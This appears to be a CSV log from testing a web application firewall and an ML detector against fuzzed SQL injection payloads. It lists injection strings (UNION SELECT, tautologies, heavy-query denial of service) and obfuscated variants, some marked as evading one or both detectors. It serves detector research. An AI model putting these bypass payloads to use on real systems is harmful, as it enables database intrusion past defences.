Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
1,2024-12-16T18:26:15.220908,1  )   where 9708  =  9708,403,200,200,both_incorrect,"(SELECT 'uJ'<>'uJF') 	)  /*,F.YL*/wHEre 9708   like   (SELECT 9708)",2024-12-16T18:26:17.167262,403,403,both_correct,"(SeLEct 'uJ'!='uJF') 	)
 /**/whERE (selEcT (SElECt/**/1))   LikE   (sELEcT 'W'='W')",2024-12-16T18:26:21.355877,403,403,both_correct,"(SELeCT 'uJ'!='uJF') 
)
 /**/wHErE (sELect (SelEcT/*mk;*/ && (SeleCt/**/3136 lIKE 3136)))   LIke   (SElect 'W'='W')",2024-12-16T18:26:26.258634,403,200,waf_correct_ml_incorrect,"(seLecT 'uJ'!='uJF') 	)
 /**/WhEre (SElecT (sELecT/*:o@*/  and  (sELecT (SELECT (SELECT ':d' NOT LIKE ':dF')) like 3136)))   LIke   (sELEcT 'W'='W')",2024-12-16T18:26:32.720111,403,403,both_correct,"(SElEcT 'uJ'!='uJF') 
)
 /**/wherE (Select (sElECt/*:o@*/  aNd  (seleCt (sEleCt (sElECT/**/':d' NOT LIKE ':dF')) LIke 0x19ec<> AND 1)))   LIkE   (sElECT 'W'='W')",2024-12-16T18:26:40.972069,403,403,both_correct
2,2024-12-16T18:26:49.644167,"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",403,403,403,both_correct,"-9848' union
all/**/selecT 1359,(SELECT 1),1359,1359,3047 LIkE 3047,1359,0x54f,1359,1359,1359--",2024-12-16T18:26:53.312061,403,403,both_correct,"-9848' union all/**/selecT '(' NOT LIKE '(~',(SeLect (SELeCt 1)),1359,1359,3047/**/lIKE 0xbe7,1359,0x54f,1359,1359,1359--",2024-12-16T18:26:58.869583,403,403,both_correct,"-9848' union all selecT '(' NOT LIKE '(~',(sEleCt
(SeLecT 0x1)), ANd 1,2646 not like 2647,3047/**/LikE 0xbe7,1359,0x54f,1359,1359,1359--",2024-12-16T18:27:05.778516,403,403,both_correct,"-9848' union all selecT '(' NOT LIKE '(~',(SeLEct
(SElECt 0x1)), And 1,2646 not like 2647,3047 lIKE 0xbe7,
OR 0,0x54f,(SelEcT 1359),1359,6614 IN (6613,6614,6615)--",2024-12-16T18:27:13.340881,403,403,both_correct,"-(SELECT 1)'/**/union all selecT '(' NOT LIKE '(~',(seleCt
(SeLECt 0x1)), aND 1,2646 not like 2647,3047	lIKE 0xbe7,
OR (SELECT 0),0x54f,(sELECT 1359),1359,6614 in (6613,'I'='I',6615)--",2024-12-16T18:27:22.103218,403,403,both_correct
3,2024-12-16T18:27:31.879639,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",403,403,200,waf_correct_ml_incorrect,"SEleCT LiKE  (  'abcdefg',upper  (  hex  (  randomblob  (  0x1dcd6500/(SeLect 'n
g'!='n
g;')   )    )  	 /**/ )    )    AND    (    (   '%'   Like   '",2024-12-16T18:27:37.664463,403,200,waf_correct_ml_incorrect,"SEleCT likE  (  'abcdefg',upper  (  hex  (  randomblob  (  0x1dcd6500/(sElEcT 'n
g'!='n
g;')   )    )      )    )    &&    (    (   '%'   like   '",2024-12-16T18:27:45.794631,403,200,waf_correct_ml_incorrect,"SeLeCT lIke  (  'abcdefg',upper  (  hex  (  randomblob  (  0x1dcd6500/(sEleCT 'n
g' not like 'n
g;')   )    )  	   )    )    &&/**/   (    (   '%'   likE   '",2024-12-16T18:27:53.646919,403,200,waf_correct_ml_incorrect,"SeleCT lIke  (  'abcdefg',upper  (  hex  (  randomblob  (  0x1dcd6500/(seLecT 'n
g' not like 'n g;')   )    )  	 /**/ )    )    &&/**/   (    (   '%'   LIke   '",2024-12-16T18:28:02.195706,403,200,waf_correct_ml_incorrect,"SElecT LIKe  (  'abcdefg',upper  (  hex  (  randomblob  (  0x1dcd6500/(SELecT 'n
g' not like 'n g;')   )    )    /**/ )    )     and     (    (   '%'   like   '",2024-12-16T18:28:10.629776,403,200,waf_correct_ml_incorrect
4,2024-12-16T18:28:19.260016,"1'||  (  select 'dpce' from dual where 5261  =  5261 union all select null,null,null,null,null,null--",403,403,403,both_correct,"0x1'||  ( 
select 'dpce' frOm dual WheRE (SelEcT 'z.' LIKE 'z.')   like   5261 union all/**/SeleCT null,null,null,null,null,null--",2024-12-16T18:28:24.490733,403,403,both_correct,"0x1'||  (  select 'dpce' frOm dual WheRE (SelEcT 'z.' LIKE 'z.')   LIKE    AND 0x1/*{'*/union all/**/SeLECT null,null,null,null,null,null--",2024-12-16T18:28:31.738296,403,403,both_correct,"0x1'||  (  select 'dpce' frOm dual WheRE (SelEcT 'z.' LIKE 'z.')   likE 
  and 0x1/**/union all seleCT null,null,null,null,null,null--",2024-12-16T18:28:39.360937,403,403,both_correct,"0x1'||
 (  select 'dpce' frOm dual WheRE (SelEcT 'z.'/**/LIKE 'z.')   LiKE 
  AnD 0x1/**/union all sELEcT null,null,null,null,null,null--",2024-12-16T18:28:46.651382,403,200,waf_correct_ml_incorrect,"0x1'||
 (  select 'dpce' frOm dual WheRE (SelEcT 'z.'
LIKE 'z.')   liKE 
  anD 0x1/*HWE1)*/union all SELEct null,null,null,null,null,null--",2024-12-16T18:28:54.364801,403,200,waf_correct_ml_incorrect
5,2024-12-16T18:29:01.963223,ralf,200,200,200,both_correct,ralf,2024-12-16T18:29:02.296189,200,200,both_correct,ralf,2024-12-16T18:29:03.589760,200,200,both_correct,ralf,2024-12-16T18:29:04.920854,200,200,both_correct,ralf,2024-12-16T18:29:06.232172,200,200,both_correct,ralf,2024-12-16T18:29:07.535920,200,200,both_correct
6,2024-12-16T18:29:08.843310,irado,200,200,200,both_correct,irado,2024-12-16T18:29:09.210779,200,200,both_correct,irado,2024-12-16T18:29:10.582125,200,200,both_correct,irado,2024-12-16T18:29:11.962805,200,200,both_correct,irado,2024-12-16T18:29:13.336240,200,200,both_correct,irado,2024-12-16T18:29:14.723196,200,200,both_correct
7,2024-12-16T18:29:16.097062,"-8640  )   or elt  (  7657  =  5020,5020  )   and   (  2346  =  2346",403,403,200,waf_correct_ml_incorrect,"-8640  )   oR elt  (  7657   like    OR 0,5020  )   anD   (  (sElEcT 2346)  =	 7109 NOT/**/LIKE 7110",2024-12-16T18:29:19.469034,403,200,waf_correct_ml_incorrect,"-8640  )   oR elt  (  0x1de9   lIKe    oR  AND 8146=8146,5020  )   ANd   (  (SeleCt 2346)
 =	 7109 NOT LikE 7110",2024-12-16T18:29:25.514410,403,200,waf_correct_ml_incorrect,"-8640  )   oR elt/**/ ( 	0x1de9   LIke    or  and (sElEct  Or 0)=8146,5020  )   anD   (  (SeleCT 2346)
  like 	 'V'<>'Va' NOT LikE 7110",2024-12-16T18:29:31.859615,403,200,waf_correct_ml_incorrect,"- AND 1  )   Or elt  ( 	0x1de9   LiKE    or  ANd (sELEcT  Or 0) like 8146,5020  )   AnD   (  (SELEcT 2346)	  LIke 	 'V'<>'Va' NOT LikE 0x1b8b=7051",2024-12-16T18:29:39.264104,200,403,waf_incorrect_ml_correct,"- anD 1  )   oR elt  ( 	0x1de9  
LikE    Or  And (seLeCt  or 0) LIkE 8487 LIKE 8487, OR 0  )   AND   (  (select 2346)	  Like 	/**/'V'<>'Va' NOT LikE 0x1b8b=0x1b8b",2024-12-16T18:29:47.188062,200,403,waf_incorrect_ml_correct
8,2024-12-16T18:29:56.106713, union all select @@version--,403,403,403,both_correct," union/**/all seLECt
@@version--",2024-12-16T18:29:57.533593,403,403,both_correct,/**/union/**/all sELeCT	@@version--,2024-12-16T18:30:00.091198,403,403,both_correct," union/*'T' NOT LIKE 'Ts'*/all
SEleCT	@@version--",2024-12-16T18:30:02.826656,403,403,both_correct, union/*'T' NOT/**/like 'Ts'*/all	seLect	@@version--,2024-12-16T18:30:06.215674,403,403,both_correct, union/**/all SeleCT	@@version--,2024-12-16T18:30:09.696344,403,403,both_correct
9,2024-12-16T18:30:12.277039,"1""   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",403,403,403,both_correct," && 1""   )    )  	 oR 2826<>0xb0b  =    (/**/ SELeCt count  (  *  )   FROM sysusers aS sys1,sysusers aS sys2,sysusers AS sys3,sysusers aS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7  )  --",2024-12-16T18:30:21.293379,403,403,both_correct," && 'e' NOT/*0%*/like 'e]'""   ) 	  )  	 Or  AND (SELECT 1)<>0xb0b  =    (/**/ SeLect count  (  *  )   fRoM sysusers As sys1,sysusers As sys2,sysusers as sys3,sysusers aS sys4,sysusers As sys5,sysusers As sys6,sysusers aS sys7  )  --",2024-12-16T18:30:31.817770,200,403,waf_incorrect_ml_correct,"  anD  'e' NOT/*(SELECT '*'='*')%*/LiKE 'e]'""   )    )  	 Or  And (sElecT  AND 1)<>0xb0b  =    (/**/ sELecT count  (  *  )   fROM sysusers AS sys1,sysusers aS sys2,sysusers As sys3,sysusers aS sys4,sysusers as sys5,sysusers/**/As sys6,sysusers As sys7  )  --",2024-12-16T18:30:43.707232,200,403,waf_incorrect_ml_correct,"  AnD  'e' NOT/*(SELECT '*'='*')%*/likE 'e]'""   )    )  	 oR  And (SEleCT  ANd  aNd 1 IN (5829,5830,(SELecT 5831))) not like 0xb0b  =    (/*b9L*/ SELeCt count  ( /**/*  )   FROM sysusers	As sys1,sysusers AS sys2,sysusers aS sys3,sysusers As sys4,sysusers As sys5,sysusers/**/as sys6,sysusers As sys7  )  --",2024-12-16T18:30:56.917659,200,403,waf_incorrect_ml_correct,"  AnD  'e' NOT/*(SELECT '*'='*')%*/LIKe 'e]'"" /**/ )    )  	 OR  AND (seLeCT  aNd  anD (selEcT 1590 liKE 1590) IN ((SELecT 5829),5830,(sElecT 5831))) not like 0xb0b  =    (/*b9L*/ sELect count  ( /**/*  )   from sysusers AS sys1,sysusers AS sys2,sysusers aS sys3,sysusers aS sys4,sysusers As sys5,sysusers/**/aS sys6,sysusers aS sys7  )  --",2024-12-16T18:31:12.455487,200,403,waf_incorrect_ml_correct
10,2024-12-16T18:31:29.198206,gracindo@ajuntamentbcn2-0.jp,200,200,200,both_correct,gracindo@ajuntamentbcn2-7918 NOT LIKE (SELECT 0x1).jp,2024-12-16T18:31:30.677705,200,403,waf_correct_ml_incorrect,"gracindo@ajuntamentbcn2-'`' not like/**/'`u' NOT
LIKE (SeLEcT 0x1).jp",2024-12-16T18:31:34.269419,200,200,both_correct,gracindo@ajuntamentbcn2-'`' not like '`u' NOT	LIKE (sElEcT 0x1).jp,2024-12-16T18:31:38.877414,200,200,both_correct,gracindo@ajuntamentbcn2-'`'/**/not like '`u' NOT	LIKE	(sELeCt 0x1).jp,2024-12-16T18:31:43.071493,200,200,both_correct,gracindo@ajuntamentbcn2-'`'/**/not	like/**/'`u' NOT	LIKE	(SEleCT 0x1).jp,2024-12-16T18:31:47.428631,200,200,both_correct
11,2024-12-16T18:31:51.876611,1%' and   (  3020  =  3020  )  *6703 and '%'  =  ',403,403,200,waf_correct_ml_incorrect,5629<>5630%' and   ( /**/3020  =   OR 0  )  *(SELECT 6703) and '%'  =	 ',2024-12-16T18:31:54.269991,403,403,both_correct," && 1<>5630%' and   (  0xbcc  =   OR 9058=9058  )  *(SELECT 6703) and '%'  =
 '",2024-12-16T18:31:58.698123,403,403,both_correct, && (SELect 1)<>1409 LikE 1409%' and   (  0xbcc /**/=   OR 9058=9058  )  *(SELECT (SELECT 6703)) and '%'  =  ',2024-12-16T18:32:03.619874,403,403,both_correct,	 and  (sElecT 0x1)<>1660<> AND 1 LIke 1409%' and   (  0xbcc /**/=   OR 9058=9058  )  *(SELECT (SELECT 6703))/**/and '%'  =  ',2024-12-16T18:32:09.957081,403,403,both_correct,  ANd  (selEcT 0x1)<>'JPm' not like 'JPmc'<> ANd 1 lIKE (SELECT 1409)%' and   (  0xbcc /**/=   OR 9058=9058  )  *(SELECT (SELECT  AND 1)) and '%'  =  ',2024-12-16T18:32:16.785819,200,403,waf_incorrect_ml_correct
12,2024-12-16T18:32:24.752340,"1,  (  select 9100  =    (  'qqpjq'||  (  select case 9100 when 9100 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ",403,403,403,both_correct,"1,  (  seLEcT 9100   like     (  'qqpjq'||  (  sElecT CAsE 9100 WHen/**/(SELECT 9739 LIKE 9739) Then	0x1 ELsE 0 ENd FROm rdb$database  )  ||'qzvzq'   )    )   ",2024-12-16T18:32:31.046130,403,403,both_correct,"5532<>(sELECT 1),  (  SeLECt 9100   LiKE     (  'qqpjq' OR   (  SeLeCT CAsE 9100 whEn (sELecT 9739 LIKE 0x260b) THeN 0x1 ELSE 0 eNd FrOm rdb$database  )  ||'qzvzq'   )    )   ",2024-12-16T18:32:39.401068,403,403,both_correct,"5532<>(sELeCt 0x1),  (  SElEct '2'<>'2]'   LIKE/**/    (  'qqpjq' or   (  SeLeCT Case 9100 wHEN (seLecT 9739
lIKe 0x260b) ThEN 0x1 ELSE  OR 0 EnD FroM rdb$database  )  ||'qzvzq'   )    )   ",2024-12-16T18:32:48.589815,403,200,waf_correct_ml_incorrect,"0x159c!=(seLeCT 0x1),  (  SELEct '(SELECT '\e_'!='\e_3')'<>'2]'   lIKE/**/    (  'qqpjq' OR   (  seLEct CasE 9100 wHEN (SeLECT 9739	Like 0x260b) THen 0x1 Else  Or 0 eND fRom rdb$database  )/**/ ||'qzvzq'   )    )   ",2024-12-16T18:32:58.735068,403,200,waf_correct_ml_incorrect,"0x159c NOT LIKE (sElEct 0x1),  (  SELECt '(SELECT '\e_'!='\e_3')'<>'(SELECT 2)]'   likE     (  'qqpjq' or   (  seLEcT CaSe  OR 0 WHEN (SEleCT 9739 LikE 0x260b) ThEN 0x1 elSE  OR 9848<>9849 end froM rdb$database  )/*8AEb%*/ ||'qzvzq'   )    )   ",2024-12-16T18:33:09.617746,403,403,both_correct
13,2024-12-16T18:33:22.216555,"1""   )    )    as vbdo where 3882  =  3882",403,403,200,waf_correct_ml_incorrect,"'/L'!='/LC'""   )    )  /**/ As vbdo wHErE (SELeCT 3882)  	lIke    Or 0",2024-12-16T18:33:24.361238,403,200,waf_correct_ml_incorrect,"'/L'!='/LC'""  	)    )    As vbdo WHerE (seLecT 3882)  	LiKE    Or 0x24cd LIKE  && 1",2024-12-16T18:33:28.787379,403,200,waf_correct_ml_incorrect,"'/L'!='/LC'""  
)    )    aS vbdo WHErE (sELecT (SELECT 1))/**/ 	liKE    Or 0x24cd liKE  && (SelECT '
PxK' LiKe '
PxK')",2024-12-16T18:33:33.756572,403,403,both_correct,"'/L'!='/LC'""  
)    )    AS vbdo WhERe (selECt (SelEcT 7872 in ( and 1,0x1ec0,7873)))  
lIKe    or 0x24cd liKE  && (SELeCT '
PxK' LikE '
PxK')",2024-12-16T18:33:40.329732,403,403,both_correct,"'/L'/**/not like '/LC'""  
)    )    AS vbdo whErE (SeLEcT (SeLeCT 7238!=(SeLECt 7239) In ( And 1,0x1ec0,(SeLECt 1))))  
LIke   	oR 0x24cd LIke  && (sELect '
PxK' LiKE '
PxK')",2024-12-16T18:33:48.240351,403,403,both_correct
14,2024-12-16T18:33:57.422264,73107657h,200,200,200,both_correct,73107657h,2024-12-16T18:33:57.975545,200,200,both_correct,73107657h,2024-12-16T18:33:59.527625,200,200,both_correct,73107657h,2024-12-16T18:34:01.065055,200,200,both_correct,73107657h,2024-12-16T18:34:02.592514,200,200,both_correct,73107657h,2024-12-16T18:34:04.142583,200,200,both_correct
15,2024-12-16T18:34:05.687840,"-7743"" or 9323  =  9323#",403,403,200,waf_correct_ml_incorrect,"-(SElEcT (SELECT 1))""/**/Or 9323 	 like   3290 LIKE 3290#vz",2024-12-16T18:34:06.917664,403,403,both_correct,"-(SELEct (SEleCT (SELECT 1) NOT LIKE 0x14ba))""/**/OR 9323 
 LIke/**/  3290 LIke 3290#vzy<",2024-12-16T18:34:10.727711,403,403,both_correct,"-(SELECT (SElect (SElECt 'e=' LIKE 'e=') NOT LIKE 0x14ba))"" OR (SELECT 1) 
 lIke/**/  3290
Like 0xcda#vzy<",2024-12-16T18:34:15.921756,403,403,both_correct,"-(SElect (SelEct (SeLEct 'e=' lIKE 'e=')/**/NOT LIKE 0x14ba))"" OR (SElECt (SEleCT 1)) 
 LIkE/*?v+,1*/  979 iN (978,979, OR 0)	lIKe 0xcda#vzy<",2024-12-16T18:34:22.205759,403,200,waf_correct_ml_incorrect,"-(SeLEct (sELECt (SeLeCT 'e=' LIkE/**/'e=')/**/not like 0x14ba))"" OR (sElEct (SElECt (SELECT 1))) 
 LIkE/*?v+,1*/ 
 ANd 1 IN (978,979, Or 'E' NOT LIKE 'Ed')	lIke 0xcda#vzy<h",2024-12-16T18:34:29.895683,403,403,both_correct
16,2024-12-16T18:34:39.034146," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",403,403,403,both_correct," SElECT * FRoM users Where id   like  
/**/OR 'Lg!c''<>'Lg!c'4' oR \<\. union sELecT 0x1,@@VERSION -- 1?",2024-12-16T18:34:42.514239,403,403,both_correct," sELeCT * FrOm users WhERe id   liKe  	 oR 'Lg!c''<>'Lg!c'(SELECT  OR 0)' or \<\. union SElect 0x1,@@VERSION -- '/`' LIKE '/`'?{8",2024-12-16T18:34:48.653790,403,403,both_correct," SELEcT * From users/*)*/wheRe id   lIkE  	
Or 'Lg!c''<>'Lg!c'(SELECT  OR 6832 LIKE 6832)' or \<\. union SEleCt 0x1,@@VERSION -- '/`' LIKE '/`'?{(SELECT (SELECT 1))",2024-12-16T18:34:55.588264,403,403,both_correct," seLect * fRom users/*)*/WhEre id   LikE   
or 'Lg!c''<>'Lg!c'(SELECT  OR 6832 LIKE '-'<>'-X')' oR \<\. union SElecT 0x1,@@VERSION -- '/`'/**/LIKE '/`'?{(SELECT (SELECT (SELECT (SELECT 1))))",2024-12-16T18:35:04.295620,403,403,both_correct," SELeCt * FrOM users/*)*/wherE id   LikE    or 'Lg!c''<>'Lg!c'(SELECT  OR  AND 'k'<>'kC' LIKE '-'<>'-X')' or \<\./**/union SeLeCt 0x1,@@VERSION -- '/`'/**/LIKE '/`'?{(SELECT (SELECT (SELECT (SELECT 0x1))))Ta",2024-12-16T18:35:14.409912,403,403,both_correct
17,2024-12-16T18:35:24.994768,"1"" and 7533  =  7533",403,403,200,waf_correct_ml_incorrect,"0x10cb!=4300"" anD 7533/**/	 LIKE    OR 0",2024-12-16T18:35:26.050233,200,200,both_incorrect,"0x10cb!= anD 1"" AND 0x1d6d/**/
 lIkE /**/  OR '`' lIKe '`'",2024-12-16T18:35:28.992031,200,200,both_incorrect,"0x10cb!=	AnD  AND 3990!=0xf97"" aND/**/0x1d6d/*Tez*/
 LIKE /**/  oR '`' like '`'",2024-12-16T18:35:32.815212,200,200,both_incorrect,"0x10cb not like 	aND  And 0xf96!=0xf97"" ANd/**/0x1d6d/*^9d	*/
	LiKE /**/  oR '`'/**/LIkE '`'",2024-12-16T18:35:37.629820,200,200,both_incorrect,"0x10cb not like 	aND /**/ANd 0xf96!=0xf97"" and/**/0x1d6d/*^9d	*/ 	LiKE /**/  || '`'/**/lIKE '`'",2024-12-16T18:35:43.287330,200,200,both_incorrect
18,2024-12-16T18:35:48.789345,milly7,200,200,200,both_correct,milly7,2024-12-16T18:35:49.203248,200,200,both_correct,milly7,2024-12-16T18:35:50.583257,200,200,both_correct,milly7,2024-12-16T18:35:52.010275,200,200,both_correct,milly7,2024-12-16T18:35:53.425073,200,200,both_correct,milly7,2024-12-16T18:35:54.840316,200,200,both_correct
19,2024-12-16T18:35:56.248017,jose cadalso s/n 7d,200,200,200,both_correct,jose/**/cadalso s/n	7d,2024-12-16T18:35:57.254405,200,200,both_correct,jose cadalso	s/n	7d,2024-12-16T18:35:59.392406,200,200,both_correct,jose/**/cadalso	s/n 7d,2024-12-16T18:36:01.393821,200,200,both_correct,"jose/*$)yru*/cadalso
s/n/**/7d",2024-12-16T18:36:03.569977,200,200,both_correct,jose/*$)yru*/cadalso	s/n 7d,2024-12-16T18:36:06.113891,200,200,both_correct
20,2024-12-16T18:36:08.470956,-8187'   )    )     )   or 1698  =  2823#,403,403,200,waf_correct_ml_incorrect,"-0x1ffb' /**/ )	   )     )   Or 9654 IN (9653,9654,9655)   LIKe   (SEleCt 1)#@;",2024-12-16T18:36:10.517748,403,403,both_correct,"-0x1ffb' /*#O;*/ )	  /**/)     )   or  OR
3553=3553 In ((seLECt 9653),9654,9655)   LIke   (SELeCt 1)#@;",2024-12-16T18:36:15.545965,403,403,both_correct,"-0x1ffb' /**/ )	 /**//*B;	N^*/)     )   OR  Or 3553 LIKE 7992 liKe 7992 in ((SELECt 9653), AND (SELECT 1),9655)   lIKe   (select 1)#@;",2024-12-16T18:36:21.528659,403,403,both_correct,"-0x1ffb'   )	 /*j*//*B;
N^*/)     )   ||  OR 1176!=(sElecT 1177) LiKE 7992 LIKE 7992 IN ((seLECT 9653), and (SELEct 1), AND 1)   Like   (SELeCT 1)#@;",2024-12-16T18:36:28.911608,403,200,waf_correct_ml_incorrect,"-0x1ffb'   )
  /*B;
N^*/)     )    OR   oR 1176!=(SElecT 1177) likE  aNd 1 like 2112 IN (2111,2112,2113) In ((SeLect (SELECT 9653)), ANd (sELeCT 1), anD 1)   lIKE   (SelecT 1)#@;N",2024-12-16T18:36:36.940126,403,403,both_correct
21,2024-12-16T18:36:46.717559,"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi",403,403,200,waf_correct_ml_incorrect,"(seLect  OR 0)'   )    ) 	   )   or 'B[' LIKE 'B['  =/**/   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi",2024-12-16T18:36:54.724176,403,200,waf_correct_ml_incorrect,"(selECt  OR  OR 't'!='te')'   )    ) 	   )   or 'B[' LIKE
'B['  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi",2024-12-16T18:37:04.860532,403,200,waf_correct_ml_incorrect,"(sELEct  or  OR 't' not like 'te')'   )    )     )   or 'B[' LIKE
'B['  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (   /**/(     (  'ewwi'  =  'ewwi",2024-12-16T18:37:15.911472,403,403,both_correct,"(SeLeCt  OR  Or 't' not like 'te')'   )    )     )   or 'B[' LIKE	'B['  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi",2024-12-16T18:37:27.101702,403,403,both_correct,"(SElEct  oR  OR 't' not like 'te')'   )    )     )   or 'B[' LIKE	'B['  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    ( 	   (  'ewwi'  = /*""*/'ewwi",2024-12-16T18:37:38.487790,403,403,both_correct
22,2024-12-16T18:37:49.761950,389,200,200,200,both_correct,(SelEcT/**/0x1),2024-12-16T18:37:50.040813,403,200,waf_incorrect_ml_correct,(seLECt 0x1),2024-12-16T18:37:51.863063,403,200,waf_incorrect_ml_correct,"(SeLeCt
0x1)",2024-12-16T18:37:53.567885,403,403,both_incorrect,(SeLeCt 0x1),2024-12-16T18:37:55.257682,403,403,both_incorrect,(SelECt	0x1),2024-12-16T18:37:56.948915,403,403,both_incorrect
23,2024-12-16T18:37:58.645317,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",403,403,403,both_correct,"-2190' 
)   WhEre 8890 /**/ LIKE    AND 1 union all SeLECt '5'!='5G',0x22ba#",2024-12-16T18:38:01.706671,403,403,both_correct,"- AND 1 liKe 2296'  )   WhEre 8890   LIKE    AND 0x1 union all SeLECt '5'!='5G',0x22ba#",2024-12-16T18:38:06.425679,403,403,both_correct,"-/**/&& 'KB' NOT LIKE 'KBj' Like (SELECt 1)'  )   WhEre 8890   LIKE    AND 0x1
union all SeLECt '(SELECT 5)'!='5G',0x22ba#t",2024-12-16T18:38:11.647645,403,403,both_correct,"-/**/&& 'KB' NOT LIKE/**/'KBj' lIke (sELECt 1)'  )   WhEre 'Fa' NOT LIKE 'Fa,'   LIKE    AND 0x1	union all SeLECt '(sElEcT (SELECT  and 1))'!='5G',0x22ba#tHr",2024-12-16T18:38:18.509657,403,403,both_correct,"-/**/&& 'KB' not like/**/'KBj' lIKE (seLecT  AND 4819 LIKE 4819)'  )   WhEre 'Fa' NOT LIKE 'Fa,'  	LIKE    AND 0x1	union all SeLECt '(seLECt (SeLeCt /**/AND (SELECT 1)))'!='5G',0x22ba#tHr.",2024-12-16T18:38:26.893641,403,403,both_correct
24,2024-12-16T18:38:36.898990,"1""  )   where 3826  =  3826",403,200,200,both_incorrect,"1""  )	 /**/whEre (SELECT 3141)!= || 0  =  3826",2024-12-16T18:38:38.244978,200,403,waf_incorrect_ml_correct,"0x1""  )
  wHerE (SeLECt 3141)!= ||  && 1=7600  =  3826",2024-12-16T18:38:41.433322,200,200,both_incorrect,"0x1""  )
  wHERE (SeLect (SELECT '^ ' NOT LIKE '^ e'))!= || 
&& 1/**/like 7600  =  0xef2",2024-12-16T18:38:45.073639,403,403,both_correct,"0x1""  )
  whErE (SeLecT (selECT '^ ' NOT LIKE '^ e'))!=  OR  
&&
(SELECT 8991) LIke 8991 LiKe  OR 0  =  0xef2",2024-12-16T18:38:50.259649,403,403,both_correct,"0x1""  )   WHerE (SeleCt (selEcT/**/'^ ' NOT LIKE '^ e'))!=  oR  
&&
(seLeCT 4826!=(SELECT 1)) LIkE 0x231f like  OR 0   like   0xef2",2024-12-16T18:38:56.659083,403,403,both_correct
25,2024-12-16T18:39:03.911506,ubaldino,200,200,200,both_correct,ubaldino,2024-12-16T18:39:04.419958,200,200,both_correct,ubaldino,2024-12-16T18:39:05.899780,200,200,both_correct,ubaldino,2024-12-16T18:39:07.371248,200,200,both_correct,ubaldino,2024-12-16T18:39:08.892976,200,200,both_correct,ubaldino,2024-12-16T18:39:10.429587,200,200,both_correct
26,2024-12-16T18:39:11.921255,"1""  )   and elt  (  1889  =  7397,7397  )   and   (  ""kuau""  =  ""kuau",403,403,200,waf_correct_ml_incorrect," && 1""  )/**/  and elt  (  1889  =  7049<>7050,0x1ce5	 )   and   (  ""kuau""  =  ""kuau",2024-12-16T18:39:15.258560,403,200,waf_correct_ml_incorrect,"  AND  'rcr' NOT LIKE 'rcr#'""  )   and elt  (  (SELECT 1) 
=  7049<>0x1b8a,0x1ce5	 )   and   (  ""kuau""  =  ""kuau",2024-12-16T18:39:20.270533,403,403,both_correct,"  And  'rcr' not like 'rcr#'""  )   and elt  (  (SELECT '=' LIKE '=') 
=  /**/OR (SELECT 0)<>0x1b8a,0x1ce5	 )  	and   (  ""kuau""  =  ""kuau,",2024-12-16T18:39:26.474707,403,403,both_correct,"  and  'rcr' not like 'rcr#'""  )   and elt  (  (SELECT '=' LIKE '=') 
=  /**/OR (SELECT (SELECT 'pFz' LIKE 'pFz'))<>0x1b8a,0x1ce5  ) /**/	and   (  ""kuau""  =  ""kuau,:",2024-12-16T18:39:34.136323,403,403,both_correct,"  and  'rcr' not	like 'rcr#'""  )  /**/and elt  (  (SELECT '=' LIKE '=') 
=  /**/OR (SELECT (SELECT  OR (SELECT 1359)!=1360))<>0x1b8a,0x1ce5  ) /**/	and   (  ""kuau""  =  ""kuau,:(",2024-12-16T18:39:42.796946,403,403,both_correct
27,2024-12-16T18:39:51.945730,22468230j,200,200,200,both_correct,22468230j,2024-12-16T18:39:52.476065,200,200,both_correct,22468230j,2024-12-16T18:39:54.199419,200,200,both_correct,22468230j,2024-12-16T18:39:55.817668,200,200,both_correct,22468230j,2024-12-16T18:39:57.391086,200,200,both_correct,22468230j,2024-12-16T18:39:58.956420,200,200,both_correct
28,2024-12-16T18:40:00.492321,strom.mahieuy4@karldeux.ac,200,200,200,both_correct,strom.mahieuy4@karldeux.ac,2024-12-16T18:40:01.848791,200,200,both_correct,strom.mahieuy4@karldeux.ac,2024-12-16T18:40:04.163341,200,200,both_correct,strom.mahieuy4@karldeux.ac,2024-12-16T18:40:06.533239,200,200,both_correct,strom.mahieuy4@karldeux.ac,2024-12-16T18:40:08.850562,200,200,both_correct,strom.mahieuy4@karldeux.ac,2024-12-16T18:40:11.144430,200,200,both_correct
